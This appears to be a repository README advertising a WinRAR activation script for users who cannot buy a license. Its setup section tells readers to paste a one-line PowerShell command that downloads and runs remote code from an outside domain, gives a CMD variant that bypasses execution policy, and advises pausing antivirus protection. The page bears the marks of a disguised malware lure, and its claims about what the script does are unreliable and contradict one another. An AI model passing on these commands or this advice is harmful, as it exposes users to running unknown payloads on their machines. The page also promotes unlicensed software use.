<div align="center">

# WinRAR Activation Automation Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/yashusaii27-ux/winrar-license-setup-helper/main/hero_8c41.svg)

[![language](https://img.shields.io/badge/LANGUAGE-PYTHON-84cc16?style=flat&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-VERIFIED-2ea44f?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-SCRIPT-a3e635?style=flat&labelColor=0d1117)]()

</div>

---

The WinRAR Activator offers a straightforward, one-line solution for individuals and students who can't purchase a license, letting you register your copy quickly and get back to work. It's built for people who want the trial notification gone without editing files or chasing down keys by hand. Run the script, let it handle the activation, and WinRAR behaves like a licensed install.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What it does

Registers your copy of WinRAR by dropping a valid license key into the installation folder, so the trial-expired pop-up stops appearing. It does not patch binaries, modify the executable, or touch anything outside the license file, which means the change survives WinRAR updates and is trivial to reverse — delete the key file and you're back to the trial.

The project ships three ways to do the same thing, so you can pick whichever fits your setup:

- **One-line script:** Pulls and runs the activation script in a single command, handling the file placement for you. Best for a fresh, standard WinRAR install on a machine you control.
- **Standalone script file:** A downloadable script you run with administrative rights. Useful when you'd rather inspect the code before running it, or when execution policy blocks the one-liner.
- **Manual key file:** A plain license file you copy into the WinRAR directory yourself. The fallback for locked-down machines, offline systems, or anyone who just prefers to see exactly what lands on disk.

Under the hood it's all the same operation: locate the WinRAR install path, write the key file, and let WinRAR pick it up on next launch. No services, no scheduled tasks, no registry surgery. If a previous modified or repackaged install is in the way, clean it out first — leftover files from those builds can shadow the key and make activation look like it failed.

## How to Activate

Run the activation flow that matches your Windows version and access level. Each path below maps to the same underlying license-application logic, so choose one and stick with it.

#### PowerShell (Windows 10/11)

Launch PowerShell or Windows Terminal as Administrator (right-click the Start button and pick the elevated option). With the elevated prompt focused, invoke the activator entry script from this repository. The script handles the license placement itself; you don't need to touch any WinRAR directories manually. When it finishes, the process exits cleanly and the trial notice is gone on the next WinRAR launch.

If your execution policy blocks unsigned scripts, run the entry point through a one-off bypass in the current session rather than changing the machine-wide policy. That keeps the activation scoped to the window you opened.

#### Command Prompt (Windows 7/8/8.1)

Grab the `WAS.cmd` file from this repository, right-click it, and select **Run as Administrator**. The batch wrapper calls the same activation routine as the PowerShell path and closes when done. No additional configuration is required.

#### Manual Activation (All Windows Versions)

If the scripted paths aren't an option on your machine, apply the license by hand:

- Pull the `rarreg.key` file from this repository.
- Copy it to your clipboard.
- Open your WinRAR install directory (typically `C:\Program Files\WinRAR\` on 64-bit systems, or the corresponding Program Files path on your drive) and paste the file in.
- Close every open WinRAR window, then relaunch. The trial prompt should no longer appear.

#### Verifying the Activation

Open WinRAR and check the About dialog. A registered build shows the license holder line instead of the remaining-trial-days counter. If you still see the trial counter, the key didn't land in the right directory — recheck the install path before retrying.

#### Re-running After Updates

WinRAR updates generally preserve an existing license file, so you usually won't need to re-run anything. If an update wipes the key, repeat whichever activation path you used originally. The script is idempotent, so running it twice does no harm.

## Configuration

Configuration is intentionally minimal. The script ships with sane defaults and requires no editing for a typical activation. The points below cover what you can actually change and where the script expects things to be.

- **No mandatory settings.** Running the script as-is is the intended path. There are no required environment variables, config files, or flags to set before first use.
- **Administrative context is the only real prerequisite.** The script needs elevated privileges to write the license into the WinRAR program directory. If you run it without elevation, expect it to fail quietly or refuse to proceed rather than prompt you.
- **Install path detection.** The script locates the WinRAR installation by checking the standard program directory first and falling back to the registry entry for WinRAR if present. If you installed WinRAR somewhere non-standard, either reinstall to the default location or copy the license file manually into your WinRAR folder as described in the activation steps.
- **Overwriting existing license files.** If a `rarreg.key` already exists in the WinRAR folder, the script will replace it. Back up the original if you care about keeping it. There is no automatic backup step.
- **Script behavior is fixed by design.** Timeouts, retry counts, and logging are hardcoded. There are no supported flags for tweaking them, and editing the script to change these is unsupported. Keep a copy of the original if you modify anything.
- **Idempotent runs.** Running the script multiple times is safe. It overwrites the same file with the same contents, so re-running after a WinRAR update is the expected recovery action rather than a troubleshooting step.
- **No persistent configuration is stored.** The script does not write settings to disk, create config directories, or leave state behind beyond the license file it places in the WinRAR folder. Removing that file is the full uninstall.
- **Network access matters only for the one-liner method.** The PowerShell invocation fetches the script on each run, so proxy or firewall restrictions can block it. The downloaded-file and manual methods have no network dependency during activation.

If your setup deviates from the defaults above, the manual activation path is the reliable fallback. Everything else is a matter of running the script with the right privileges and pointing it at a standard WinRAR install.

## Troubleshooting

- **Conflicts with previous alternatives:** If WinRAR was previously activated with a patched executable or a repackaged installer, the existing license file may conflict with the one this script writes. Fully uninstall the old copy, clear leftover files in the WinRAR program folder, then reinstall from a clean official installer before running the activator again.

- **Permission errors:** The script needs to write into the WinRAR installation directory. If activation silently fails or you see an access-denied message, rerun the script from an elevated shell (Run as Administrator) and confirm the install path exists at the default location.

- **Activation appears to revert:** A pending WinRAR update can overwrite the license file. Close WinRAR completely, rerun the activator, then reopen the app. If it reverts again after an update, repeat the activation once the update finishes.

- **Antivirus or SmartScreen flags:** Security tools often quarantine license-modifying scripts. If the script is blocked or deleted mid-run, check your AV quarantine, restore the file, and allow it for the WinRAR folder only. Do not disable real-time protection system-wide.

- **Script exits without output:** Run it from a terminal you keep open rather than a double-click, so error messages stay visible. Verify you are on the official WinRAR build, not a portable or store variant, since those use different install paths.

- **License file not taking effect:** Confirm `rarreg.key` landed directly in the WinRAR program folder (not a subfolder) and that no duplicate copy sits in your user profile. Close all WinRAR windows, including background tray instances, then relaunch.

- **Still stuck:** Note your Windows version, WinRAR version, install path, and the exact error text, then open an issue on this repository with those details so the problem can be reproduced.

## Disclaimer

This project is provided strictly for educational and personal convenience. It is not affiliated with, endorsed by, or supported by WinRAR or its developers. By using this script, you acknowledge that you are solely responsible for how it is used and for understanding the licensing terms that apply to WinRAR in your region.

Activation via this method does not grant you a legitimate license. If you rely on WinRAR for professional, commercial, or long-term use, purchase a license from the official source. Consider this a stopgap, not a permanent replacement.

The script modifies license-related configuration only. It does not patch binaries, inject code, or alter the WinRAR installation itself, but you should still review what it does before running it. Run it only on systems you own or administer, and keep a backup of any existing license files. Behavior may vary across WinRAR versions, and future updates could invalidate the activation or break the script entirely.

No warranty is provided, express or implied. The maintainers accept no liability for data loss, system instability, license violations, or any other damages arising from use of this project. Use at your own risk, and prefer the official trial or a purchased license when in doubt.